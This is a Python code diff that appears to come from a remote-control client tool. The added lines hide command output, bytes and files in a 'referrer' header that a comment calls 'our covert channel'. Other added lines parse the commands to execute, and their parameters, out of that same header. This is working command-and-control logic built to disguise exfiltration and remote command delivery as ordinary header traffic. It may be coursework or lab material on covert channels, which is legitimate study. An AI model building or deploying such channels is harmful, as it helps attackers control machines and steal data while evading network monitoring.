@@ -31,23 +31,27 @@ class Request:
 		if status == Status.FAIL:
 			self.header["error"] = send
 
-		self.header["referrer"] = "" #this is where our covert channel is
+		 #this is where our covert channel is
 
 		if isinstance(body, dict): #if the passed body is a diction; we are sending text
 			self.header["ct"] = "TEXT"
 
 			if status == Status.FAIL:
 				self.body = {"output": "", **body}
+				self.header["referrer"] = {"output": send, **body}
 			else:
 				self.body = {"output": send, **body}
+				self.header["referrer"] = {"output": send, **body}
 		
 		elif isinstance(body, bytes): #if the passed body is bytes then we sending bytes
 			self.header["ct"] = "BYTES"
 			self.body = body
+			self.header["referrer"] = body
 		
 		elif isinstance(body, object):  #if the passed body is object then we sending a file
 			self.header["ct"] = "FILE"
 			self.body = body
+			self.header["referrer"] = body
 
 		self.header = {**self.header, **header}
 
@@ -175,6 +179,9 @@ class Client():
 
 	def send(self, req:Request) -> None:
 		for payload in req:
+			
+			print ("PAY LAOD: ")
+			print(payload)
 			self.conn.send(payload)
 
 
@@ -193,15 +200,17 @@ class Client():
 			
 			print (response)
 
-			cmd = response.cmd #get the specific command
+			referrerCMDS = response.header["referrer"].split(" ")# get the cmd from the referrer header
 
-			ack = response.cmd
+			#print(referrerCMDS)
+			cmd = referrerCMDS[0] #Get the First word aka the COmmand
 
-			# TODO: Parse the CMD and parameter from REFERRER Field
-
+			ack = response.ack
 
 			#splits up the commands
-			params = response.params.split(" ") if response.params else response.params
+			params = referrerCMDS[1:] if referrerCMDS[1:] else None
+
+			#params = response.params.split(" ") if response.params else response.params
 
 			if response._direct:  #commands to execute
 				self.method_direct(cmd, ack, params)
